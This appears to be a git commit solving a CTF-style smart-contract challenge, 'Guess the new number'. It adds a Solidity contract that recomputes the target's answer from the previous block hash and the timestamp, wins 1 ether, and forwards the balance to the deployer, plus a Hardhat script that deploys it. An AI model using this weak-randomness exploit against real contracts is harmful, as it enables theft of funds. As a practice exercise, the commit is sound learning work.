46531faccaa1b64eb081df5f049a75a98238e6c2
sogasg <sogasg@gmail.com>
2021-10-31 15:53:48 +0100

    Guess the new number done

---
+++ contracts/GuessTheNewNumber.sol
@@ -0,0 +1,31 @@
+pragma solidity ^0.8.0;
+
+interface GuessTheNewNumberChallenge {
+    function guess(uint8 n) external payable;
+}
+
+contract GuessTheNewNumber {
+    address private constant challengeAddress =
+        0x08962e45b45153c3365592040E50aCa99370d62c;
+
+    constructor() payable {
+        uint8 answer = uint8(
+            uint256(
+                keccak256(
+                    abi.encodePacked(
+                        blockhash(block.number - 1),
+                        block.timestamp
+                    )
+                )
+            )
+        );
+
+        GuessTheNewNumberChallenge(challengeAddress).guess{value: 1 ether}(
+            answer
+        );
+
+        uint256 amount = address(this).balance;
+        (bool success, ) = msg.sender.call{value: amount}("");
+        require(success, "Failed to send Ether");
+    }
+}
---
+++ scripts/deploy-guess-the-new-numer.ts
@@ -0,0 +1,19 @@
+import { ethers } from "hardhat";
+
+async function main() {
+  const ContractFactory = await ethers.getContractFactory("GuessTheNewNumber");
+  const contract = await ContractFactory.deploy({
+    value: ethers.utils.parseEther("1"),
+  });
+
+  await contract.deployed();
+
+  console.log("GuessTheRandomNumberChallenge deployed to:", contract.address);
+
+  console.log("Done!");
+}
+
+main().catch((error) => {
+  console.error(error);
+  process.exitCode = 1;
+});
